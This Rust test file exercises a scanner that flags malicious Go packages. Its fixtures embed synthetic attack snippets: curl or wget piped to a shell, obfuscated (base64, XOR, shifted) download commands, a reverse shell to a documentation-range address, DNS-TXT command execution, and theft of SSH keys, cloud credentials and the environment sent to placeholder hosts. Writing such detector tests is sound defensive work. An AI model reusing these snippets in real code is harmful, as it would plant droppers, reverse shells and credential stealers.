//! The Go reader, unit by unit: each test exercises one capability on a minimal fragment.
//!
//! The fragments are not copies of any real sample. Where one needs an address it uses a documentation range
//! (203.0.113.0/24) or a `.invalid` host (or, where a public domain is the point, example.com), and nothing here is
//! ever built or run.

use super::*;

fn u32s(s: &str) -> Vec<u32> {
    s.chars().map(|c| c as u32).collect()
}

fn st(v: &[u32]) -> String {
    v.iter().map(|&c| char::from_u32(c).unwrap_or('?')).collect()
}

fn read(files: &[(&str, &str)], opts: Options) -> Answer {
    let texts: Vec<Vec<u32>> = files.iter().map(|(_, t)| u32s(t)).collect();
    let input: Vec<(PyStr, &[u32])> = files.iter().zip(texts.iter()).map(|((p, _), t)| (u32s(p), t.as_slice())).collect();
    let pack = crate::pack::current();
    read_module(&pack, &input, &opts)
}

fn reasons(fs: &[Found]) -> Vec<String> {
    fs.iter().flat_map(|f| f.reasons.iter().map(|r| st(r))).collect()
}

fn has(rs: &[String], part: &str) -> bool {
    rs.iter().any(|r| r.contains(part))
}

/// A one-file package `p` whose `init` holds `body`.
fn init(body: &str, imports: &str) -> Answer {
    let src = format!("package p\n\nimport (\n{}\n)\n\nfunc init() {{\n{}\n}}\n", imports, body);
    read(&[("p.go", &src)], Options::default())
}

#[test]
fn a_clean_init_is_quiet() {
    let a = init("\tdefaultFlags = append(defaultFlags, \"-v\")\n\tregister(\"x\", 1)\n", "\t\"os\"");
    assert!(a.start.is_empty() && a.uses.is_empty(), "{:?}", a);
    assert_eq!(a.read, vec![0]);
}

#[test]
fn a_string_array_read_by_index_builds_a_command_run_at_load() {
    // the 2025 typosquats' shape: a package-level variable whose initializer builds `wget -O - … | /bin/bash &`
    // from a string array read by index, and starts it
    let cmd = "wget -O - https://example.invalid/s | /bin/bash &";
    let mut alphabet: Vec<char> = cmd.chars().collect();
    alphabet.sort();
    alphabet.dedup();
    let arr: Vec<String> = alphabet.iter().map(|c| format!("{:?}", c.to_string())).collect();
    let picks: Vec<String> = cmd.chars().map(|c| format!("a[{}]", alphabet.iter().position(|&x| x == c).unwrap())).collect();
    let src = format!(
        "package p\n\nimport \"os/exec\"\n\nvar handle = start()\n\nfunc start() error {{\n\ta := []string{{{}}}\n\tc := {}\n\treturn exec.Command(\"/bin/sh\", \"-c\", c).Start()\n}}\n",
        arr.join(", "),
        picks.join(" + ")
    );
    let a = read(&[("p.go", &src)], Options::default());
    assert!(has(&reasons(&a.start), "runs a downloaded script through a shell"), "{:?}", a);
}


/// The reasons of the import-time findings.
fn start(a: &Answer) -> Vec<String> {
    reasons(&a.start)
}

/// The reasons of the use-time findings.
fn uses(a: &Answer) -> Vec<String> {
    reasons(&a.uses)
}

#[test]
fn the_windows_variant_hands_cmd_a_download_to_run() {
    let a = init(
        "\tparts := []string{\"certutil -urlcache -split -f \", \"https://example.invalid/u.exe \", \"%TEMP%\\\\u.exe\", \" && \", \"%TEMP%\\\\u.exe\"}\n\
         \tc := strings.Join(parts, \"\")\n\
         \texec.Command(\"cmd\", \"/C\", c).Start()\n",
        "\t\"os/exec\"\n\t\"strings\"",
    );
    assert!(!start(&a).is_empty(), "{:?}", a);
}

#[test]
fn dns_txt_records_run_in_an_init_goroutine() {
    // shopsprint/decimal's shape: an init goroutine runs what a domain's TXT records say
    let a = init(
        "\tgo func() {\n\t\tfor {\n\t\t\trecs, err := net.LookupTXT(\"c.example.invalid\")\n\t\t\tif err == nil {\n\t\t\t\tfor _, r := range recs {\n\t\t\t\t\texec.Command(\"sh\", \"-c\", r).Run()\n\t\t\t\t}\n\t\t\t}\n\t\t\ttime.Sleep(time.Minute)\n\t\t}\n\t}()\n",
        "\t\"net\"\n\t\"os/exec\"\n\t\"time\"",
    );
    assert!(start(&a).iter().any(|r| r.contains("runs") && r.contains("receive")), "{:?}", start(&a));
}

#[test]
fn the_host_name_in_a_name_looked_up() {
    let a = init("\th, _ := os.Hostname()\n\tnet.LookupHost(h + \".b.example.com\")\n", "\t\"net\"\n\t\"os\"");
    assert!(has(&start(&a), "DNS lookup of a name it builds"), "{:?}", start(&a));
    // the machine's own name resolved is what network code does
    let a = init("\th, _ := os.Hostname()\n\tnet.LookupHost(h)\n", "\t\"net\"\n\t\"os\"");
    assert!(start(&a).is_empty(), "{:?}", start(&a));
}

#[test]
fn a_command_decoded_from_base64() {
    // `curl -s https://example.invalid/s | sh`, in base64
    let a = init(
        "\tb, _ := base64.StdEncoding.DecodeString(\"Y3VybCAtcyBodHRwczovL2V4YW1wbGUuaW52YWxpZC9zIHwgc2g=\")\n\texec.Command(\"sh\", \"-c\", string(b)).Run()\n",
        "\t\"encoding/base64\"\n\t\"os/exec\"",
    );
    assert!(has(&start(&a), "runs a downloaded script through a shell"), "{:?}", start(&a));
}

#[test]
fn a_download_written_made_executable_and_run() {
    let a = init(
        "\tresp, err := http.Get(\"https://example.invalid/p\")\n\tif err != nil {\n\t\treturn\n\t}\n\tdefer resp.Body.Close()\n\
         \tf, _ := os.Create(\"/tmp/p\")\n\tio.Copy(f, resp.Body)\n\tf.Close()\n\tos.Chmod(\"/tmp/p\", 0755)\n\texec.Command(\"/tmp/p\").Start()\n",
        "\t\"io\"\n\t\"net/http\"\n\t\"os\"\n\t\"os/exec\"",
    );
    assert!(has(&start(&a), "downloads a file and then runs it"), "{:?}", start(&a));
}

#[test]
fn code_received_and_run_out_of_sight_says_so() {
    // GR-8's follow-up: what a server sends, handed to a shell started with its window hidden or with no console
    let body = |attr: &str| {
        format!(
            "\tresp, err := http.Get(\"https://example.invalid/c\")\n\tif err != nil {{\n\t\treturn\n\t}}\n\tdefer resp.Body.Close()\n\
             \tb, _ := io.ReadAll(resp.Body)\n\tcmd := exec.Command(\"sh\", \"-c\", string(b))\n{}\tcmd.Start()\n",
            attr
        )
    };
    let imports = "\t\"io\"\n\t\"net/http\"\n\t\"os/exec\"\n\t\"syscall\"";
    for attr in ["\tcmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}\n",
                 "\tcmd.SysProcAttr = &syscall.SysProcAttr{CreationFlags: 0x08000000}\n"] {
        let a = init(&body(attr), imports);
        assert!(has(&start(&a), "runs code it receives over the network, out of sight"), "{:?}", start(&a));
    }
    let a = init(&body(""), imports);
    let r = start(&a);
    assert!(has(&r, "runs code it receives over the network") && !has(&r, "out of sight"), "{:?}", r);
}

#[test]
fn a_download_run_out_of_sight_says_so() {
    // GR-8: a payload downloaded, then started with its window hidden or with no console (evm-units' shape)
    let body = |attr: &str| {
        format!(
            "\tresp, err := http.Get(\"https://example.invalid/p\")\n\tif err != nil {{\n\t\treturn\n\t}}\n\tdefer resp.Body.Close()\n\
             \tf, _ := os.Create(\"/tmp/p\")\n\tio.Copy(f, resp.Body)\n\tf.Close()\n\tcmd := exec.Command(\"/tmp/p\")\n{}\tcmd.Start()\n",
            attr
        )
    };
    let imports = "\t\"io\"\n\t\"net/http\"\n\t\"os\"\n\t\"os/exec\"\n\t\"syscall\"";
    for attr in ["\tcmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}\n",
                 "\tcmd.SysProcAttr = &syscall.SysProcAttr{CreationFlags: 0x08000000}\n"] {
        let a = init(&body(attr), imports);
        assert!(has(&start(&a), "downloads a file and then runs it, out of sight"), "{:?}", start(&a));
    }
    let a = init(&body(""), imports);
    let r = start(&a);
    assert!(has(&r, "downloads a file and then runs it") && !has(&r, "out of sight"), "{:?}", r);
}

#[test]
fn a_connection_handed_to_a_shell() {
    let a = init(
        "\tc, err := net.Dial(\"tcp\", \"203.0.113.5:4444\")\n\tif err != nil {\n\t\treturn\n\t}\n\tcmd := exec.Command(\"/bin/sh\")\n\tcmd.Stdin, cmd.Stdout, cmd.Stderr = c, c, c\n\tcmd.Run()\n",
        "\t\"net\"\n\t\"os/exec\"",
    );
    assert!(has(&start(&a), "reverse shell"), "{:?}", start(&a));
}

#[test]
fn a_cgo_constructor_runs_at_start() {
    let src = "package p\n\n/*\n#include <stdlib.h>\n__attribute__((constructor)) static void boot(void) { system(\"curl -s https://example.invalid/s | sh\"); }\n*/\nimport \"C\"\n\nfunc F() int { return 1 }\n";
    let a = read(&[("p.go", src)], Options::default());
    assert!(has(&start(&a), "runs a downloaded script through a shell"), "{:?}", a);
    // without a constructor, the preamble's C runs when Go calls it: the use-time test's
    let src = src.replace("__attribute__((constructor)) ", "");
    let a = read(&[("p.go", &src)], Options::default());
    assert!(start(&a).is_empty(), "{:?}", start(&a));
    assert!(has(&uses(&a), "runs a downloaded script through a shell"), "{:?}", a);
}

#[test]
fn credentials_read_and_sent_at_load() {
    let a = init(
        "\thome, _ := os.UserHomeDir()\n\tdata, _ := os.ReadFile(filepath.Join(home, \".ssh\", \"id_rsa\"))\n\thttp.Post(\"https://example.invalid/c\", \"text/plain\", bytes.NewReader(data))\n",
        "\t\"bytes\"\n\t\"net/http\"\n\t\"os\"\n\t\"path/filepath\"",
    );
    assert!(!start(&a).is_empty(), "{:?}", a);
}

#[test]
fn the_whole_environment_sent_at_load() {
    let a = init(
        "\tbody := strings.Join(os.Environ(), \"\\n\")\n\thttp.Post(\"https://example.invalid/e\", \"text/plain\", strings.NewReader(body))\n",
        "\t\"net/http\"\n\t\"os\"\n\t\"strings\"",
    );
    assert!(has(&start(&a), "reads credentials or the whole environment"), "{:?}", start(&a));
}

#[test]
fn a_payload_in_a_function_used_later_is_the_use_time_tests() {
    let src = "package p\n\nimport (\n\t\"os/exec\"\n)\n\n// Flush writes the buffer.\nfunc Flush() {\n\texec.Command(\"sh\", \"-c\", \"curl -s https://example.invalid/s | sh\").Run()\n}\n";
    let a = read(&[("log.go", src)], Options::default());
    assert!(a.start.is_empty(), "{:?}", a.start);
    assert!(has(&uses(&a), "runs a downloaded script through a shell"), "{:?}", a);
    assert_eq!(a.use_read.files, 1);
}

#[test]
fn what_no_build_reads_is_not_read() {
    let payload = "package p\n\nimport \"os/exec\"\n\nfunc init() { exec.Command(\"sh\", \"-c\", \"curl -s https://example.invalid/s | sh\").Run() }\n";
    let a = read(
        &[
            ("p.go", "package p\n\nfunc F() int { return 1 }\n"),
            ("p_test.go", payload),
            ("testdata/x.go", payload),
            ("vendor/example.invalid/m/x.go", payload),
            ("_x.go", payload),
            (".x.go", payload),
            ("gen.go", &format!("//go:build ignore\n\n{}", payload)),
            ("old.go", &format!("// +build ignore\n\n{}", payload)),
        ],
        Options::default(),
    );
    assert_eq!(a.read, vec![0]);
    assert!(a.start.is_empty() && a.uses.is_empty(), "{:?}", a);
    // a build constraint some build meets is read; so is a folder named with `_` or `.`, which an import can name
    for (path, text) in [("p_linux.go", format!("//go:build linux && !ignore\n\n{}", payload)), ("_internal/x.go", payload.to_string()), (".x/x.go", payload.to_string())] {
        let a = read(&[(path, &text)], Options::default());
        assert!(!a.start.is_empty(), "{}: {:?}", path, a);
    }
}

#[test]
fn go_generate_and_linkname_are_listed_not_judged() {
    let src = "package p\n\n//go:generate sh -c \"curl -s https://example.invalid/s | sh\"\n\nimport _ \"unsafe\"\n\n//go:linkname nanotime runtime.nanotime\nfunc nanotime() int64\n";
    let a = read(&[("p.go", src)], Options::default());
    assert!(a.start.is_empty() && a.uses.is_empty(), "{:?}", a);
    assert_eq!(a.generate.len(), 1);
    assert_eq!(a.generate[0].1, 3);
    assert_eq!(a.linkname.len(), 1);
    assert_eq!(st(&a.linkname[0].2), "nanotime runtime.nanotime");
}

#[test]
fn init_code_in_another_package_of_the_module_is_followed() {
    let root = "package m\n\nimport \"example.invalid/m/internal/run\"\n\nfunc init() { run.Do(\"curl -s https://example.invalid/s | sh\") }\n";
    let inner = "package run\n\nimport \"os/exec\"\n\nfunc Do(c string) { exec.Command(\"sh\", \"-c\", c).Run() }\n";
    for module in [Some(u32s("example.invalid/m")), None] {
        let a = read(&[("m.go", root), ("internal/run/run.go", inner)], Options { module: module.clone(), ..Options::default() });
        assert!(has(&start(&a), "runs a downloaded script through a shell"), "module {:?}: {:?}", module.map(|m| st(&m)), a);
    }
}

#[test]
fn init_code_reaches_its_payload_however_deep() {
    let mut src = String::from("package p\n\nimport \"os/exec\"\n\nfunc init() { f0() }\n");
    for k in 0..12 {
        src.push_str(&format!("func f{}() {{ f{}() }}\n", k, k + 1));
    }
    src.push_str("func f12() { exec.Command(\"sh\", \"-c\", \"curl -s https://example.invalid/s | sh\").Run() }\n");
    let a = read(&[("p.go", &src)], Options::default());
    assert!(has(&start(&a), "runs a downloaded script through a shell"), "{:?}", a);
}

#[test]
fn a_loop_that_decodes_a_command() {
    // XOR with a key byte, as a decoder writes it
    let cmd = "curl -s https://example.invalid/s | sh";
    let enc: Vec<String> = cmd.bytes().map(|b| format!("0x{:02x}", b ^ 0x5a)).collect();
    let a = init(
        &format!("\tdata := []byte{{{}}}\n\tfor i := range data {{\n\t\tdata[i] ^= 0x5a\n\t}}\n\texec.Command(\"sh\", \"-c\", string(data)).Run()\n", enc.join(", ")),
        "\t\"os/exec\"",
    );
    assert!(has(&start(&a), "runs a downloaded script through a shell"), "{:?}", start(&a));
    // a key as long as the data, applied index by index
    let key: Vec<u8> = (0..cmd.len()).map(|k| (k * 7 + 3) as u8).collect();
    let enc: Vec<String> = cmd.bytes().zip(&key).map(|(b, k)| format!("{}", b ^ k)).collect();
    let keys: Vec<String> = key.iter().map(|k| k.to_string()).collect();
    let a = init(
        &format!("\tkey := []byte{{{}}}\n\tdata := []byte{{{}}}\n\tfor i, b := range key {{\n\t\tdata[i] = data[i] ^ b\n\t}}\n\texec.Command(\"sh\", \"-c\", string(data)).Run()\n", keys.join(", "), enc.join(", ")),
        "\t\"os/exec\"",
    );
    assert!(has(&start(&a), "runs a downloaded script through a shell"), "{:?}", start(&a));
    // a shift, through strings.Map
    let shifted: String = cmd.chars().map(|c| char::from_u32(c as u32 + 1).unwrap()).collect();
    let a = init(
        &format!("\ts := strings.Map(func(r rune) rune {{ return r - 1 }}, {:?})\n\texec.Command(\"sh\", \"-c\", s).Run()\n", shifted),
        "\t\"os/exec\"\n\t\"strings\"",
    );
    assert!(has(&start(&a), "runs a downloaded script through a shell"), "{:?}", start(&a));
}

#[test]
fn an_embedded_file_written_out_and_run() {
    let src = "package p\n\nimport (\n\t_ \"embed\"\n\t\"os\"\n\t\"os/exec\"\n)\n\n//go:embed blob.bin\nvar blob []byte\n\nfunc init() {\n\tos.WriteFile(\"/tmp/b\", blob, 0755)\n\texec.Command(\"/tmp/b\").Start()\n}\n";
    let a = read(&[("p.go", src)], Options::default());
    assert!(has(&start(&a), "runs a program it extracts from inside another file"), "{:?}", start(&a));
}

#[test]
fn a_file_the_parser_refuses_is_listed_and_not_read() {
    let a = read(&[("p.go", "package p\n\nfunc init() { exec.Command(\"sh\" }\n"), ("q.go", "package p\n")], Options::default());
    assert_eq!(a.unparsed, vec![0]);
    assert_eq!(a.read, vec![1]);
    assert!(a.start.is_empty());
}

#[test]
fn long_chains_and_deep_code_read_within_bounds() {
    // a `+` chain, a selector chain, an `else if` chain: walked, or cut short at the evaluator's nesting
    let plus = format!("package p\n\nvar s = f({})\n\nfunc f(x string) string {{ return x }}\n", vec!["\"a\""; 100_000].join(" + "));
    let a = read(&[("p.go", &plus)], Options::default());
    assert!(a.unparsed.is_empty());
    let sel = format!("package p\n\nfunc init() {{ g(x{}) }}\n\nfunc g(v int) {{}}\n", ".y".repeat(100_000));
    let a = read(&[("p.go", &sel)], Options::default());
    assert!(a.unparsed.is_empty());
    let elif = format!("package p\n\nfunc init() {{ if a {{ g() }}{} }}\n\nfunc g() {{}}\n", " else if a { g() }".repeat(50_000));
    let a = read(&[("p.go", &elif)], Options::default());
    assert!(a.unparsed.is_empty());
}

#[test]
fn a_long_concatenation_keeps_its_text() {
    let cmd = "curl -s https://example.invalid/s | sh";
    let pieces: Vec<String> = cmd.chars().map(|c| format!("{:?}", c.to_string())).collect();
    let a = init(&format!("\tc := {}\n\texec.Command(\"sh\", \"-c\", c).Run()\n", pieces.join(" + ")), "\t\"os/exec\"");
    assert!(has(&start(&a), "runs a downloaded script through a shell"), "{:?}", start(&a));
}

#[test]
fn package_level_values_are_read_where_used() {
    // a constant group with iota, a string array, a variable an init sets and another reads
    let src = "package p\n\nimport \"os/exec\"\n\nconst (\n\tA = iota\n\tB\n\tC\n)\n\nvar words = []string{\"curl\", \"-s\", \"https://example.invalid/s\", \"|\", \"sh\"}\n\nvar line string\n\n\
               func init() { line = strings.Join(words, \" \") }\n\nfunc init() { if C == 2 { exec.Command(\"sh\", \"-c\", line).Run() } }\n";
    let src = src.replace("import \"os/exec\"", "import (\n\t\"os/exec\"\n\t\"strings\"\n)");
    let a = read(&[("p.go", &src)], Options::default());
    assert!(has(&start(&a), "runs a downloaded script through a shell"), "{:?}", start(&a));
}

#[test]
fn ordinary_init_code_is_quiet() {
    // what init functions do: register, read configuration, set flags, compile patterns
    let src = "package p\n\nimport (\n\t\"flag\"\n\t\"os\"\n\t\"regexp\"\n\t\"strings\"\n)\n\nvar re = regexp.MustCompile(`^[a-z]+$`)\nvar debug = os.Getenv(\"P_DEBUG\") != \"\"\n\n\
               func init() {\n\tflag.BoolVar(&verbose, \"v\", false, \"verbose\")\n\tif v := os.Getenv(\"P_LEVEL\"); v != \"\" {\n\t\tlevel = strings.ToLower(v)\n\t}\n\tregistry[\"x\"] = newX\n}\n\nvar verbose bool\nvar level string\nvar registry = map[string]func() int{}\n\nfunc newX() int { return 1 }\n";
    let a = read(&[("p.go", src)], Options::default());
    assert!(a.start.is_empty() && a.uses.is_empty(), "{:?}", a);
}

#[test]
fn the_evaluators_nesting_is_bounded() {
    // each function 90 blocks deep around the call of the next, 8 calls deep: the evaluator stops at its nesting
    // bound inside a test thread's stack, and the payload is still read on its own
    let mut src = String::from("package p\n\nimport \"os/exec\"\n\nfunc init() { g0() }\n");
    for k in 0..8 {
        src.push_str(&format!("func g{}() {{ {}g{}(){} }}\n", k, "{ ".repeat(90), k + 1, " }".repeat(90)));
    }
    src.push_str("func g8() { exec.Command(\"sh\", \"-c\", \"curl -s https://example.invalid/s | sh\").Run() }\n");
    let a = read(&[("p.go", &src)], Options::default());
    assert!(has(&start(&a), "runs a downloaded script through a shell"), "{:?}", a);
}

#[test]
fn a_wiper_script_fetched_and_run() {
    // the 2025 disk-wiper modules' shape: a script fetched to a file and run by the next command of the same line
    let a = init(
        "\texec.Command(\"bash\", \"-c\", \"wget -O /tmp/done https://example.invalid/done.sh && bash /tmp/done\").Start()\n",
        "\t\"os/exec\"",
    );
    assert!(has(&start(&a), "downloads a script and runs it with bash"), "{:?}", start(&a));
}

#[test]
fn credentials_sent_when_used() {
    let src = "package p\n\nimport (\n\t\"bytes\"\n\t\"net/http\"\n\t\"os\"\n\t\"path/filepath\"\n)\n\n// Sync uploads the settings.\nfunc Sync() {\n\thome, _ := os.UserHomeDir()\n\tdata, _ := os.ReadFile(filepath.Join(home, \".ssh\", \"id_ed25519\"))\n\thttp.Post(\"https://example.invalid/u\", \"text/plain\", bytes.NewReader(data))\n}\n";
    let a = read(&[("sync.go", src)], Options::default());
    assert!(a.start.is_empty(), "{:?}", a.start);
    assert!(!uses(&a).is_empty(), "{:?}", a);
}

#[test]
fn cloud_and_registry_credentials_sent_when_used() {
    // GR-7: the cloud's and the registries' credential files are credential stores, as an SSH key is; a file that holds
    // none is not
    let sync = |dir: &str, file: &str| {
        format!("package p\n\nimport (\n\t\"bytes\"\n\t\"net/http\"\n\t\"os\"\n\t\"path/filepath\"\n)\n\n// Sync uploads the settings.\nfunc Sync() {{\n\thome, _ := os.UserHomeDir()\n\tdata, _ := os.ReadFile(filepath.Join(home, \"{dir}\", \"{file}\"))\n\thttp.Post(\"https://example.invalid/u\", \"text/plain\", bytes.NewReader(data))\n}}\n")
    };
    for (dir, file) in [(".aws", "credentials"), (".kube", "config"), (".docker", "config.json"), (".config/gcloud", "application_default_credentials.json"), (".cargo", "credentials.toml")] {
        let src = sync(dir, file);
        let a = read(&[("sync.go", src.as_str())], Options::default());
        assert!(!uses(&a).is_empty(), "{dir}/{file}: {:?}", a);
    }
    let src = sync(".config/app", "settings.json");
    let a = read(&[("sync.go", src.as_str())], Options::default());
    assert!(uses(&a).is_empty(), "{:?}", uses(&a));
}

#[test]
fn the_call_takes_its_text_as_it_is() {
    // (api::call_owned: a module's files are read from the request's text, not from a copy of each; the answer is the
    // borrowing call's, and a request whose lengths do not add up is refused the same way)
    use crate::json::Value;
    let files = [("m.go", "package m\n\nimport \"os/exec\"\n\nfunc init() {\n\texec.Command(\"/bin/sh\", \"-c\", \"curl -s https://203.0.113.7/a | sh\").Run()\n}\n"),
                 ("x.go", "package m\n\nfunc F() int { return 1 }\n")];
    let text: Vec<u32> = files.iter().flat_map(|(_, t)| u32s(t)).collect();
    let list = Value::Arr(files.iter().map(|(p, t)| Value::Arr(vec![Value::Str(u32s(p)), Value::Int(t.chars().count() as i64)])).collect());
    let args = Value::obj(vec![("files", list), ("module", Value::Str(u32s("example.test/m")))]);
    let owned = crate::api::call_owned("go_package", &args, text.clone()).expect("an answer");
    let borrowed = crate::api::call("go_package", &args, &text).expect("an answer");
    assert_eq!(crate::json::write(&owned), crate::json::write(&borrowed));
    assert!(crate::json::write(&owned).contains("runs a downloaded script through a shell"));
    let short = text[..text.len() - 1].to_vec();
    for (name, t) in [("go_package", short.clone()), ("rs_crate", short)] {
        match crate::api::call_owned(name, &args, t) {
            Err(crate::api::CallError::BadArgs(m)) => assert!(m.ends_with("the files' lengths run past the text"), "{}", m),
            other => panic!("{:?}", other.is_ok()),
        }
    }
}
